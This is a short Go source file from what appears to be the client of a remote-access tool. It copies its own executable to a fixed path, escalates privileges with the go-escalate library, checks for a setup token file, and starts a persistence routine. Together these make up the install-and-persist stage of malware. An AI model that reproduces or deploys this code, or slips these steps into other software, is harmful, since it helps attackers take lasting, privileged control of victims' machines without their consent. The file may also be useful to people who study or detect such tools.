// +build !android

package client

import (
	"errors"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/lu4p/go-escalate"
)

func copyExecuteable() error {
	log.Println("copyExecuteable")
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	data, err := ioutil.ReadFile(ex)
	if err != nil {
		return err
	}
	err = os.MkdirAll(Path, os.ModePerm)
	if err != nil {
		return err
	}
	return ioutil.WriteFile(PathExe, data, os.ModePerm)
}

// Elevate elevate task
func Elevate() error {
	log.Println("Elevate")
	err := copyExecuteable()
	if err != nil {
		return errors.New("Copy failed")
	}
	return escalate.Escalate(PathExe)
}

// CheckSetup check wheter already configured
func CheckSetup() bool {
	log.Println("CheckSetup")
	osexe, _ := os.Executable()
	if osexe == PathExe {
		_, err := os.Stat(filepath.Join(Path, "token"))
		return err != nil
	}
	return false
}

// Setup add Persitence
func Setup() {
	log.Println("Setup")
	go Persist(PathExe)
}
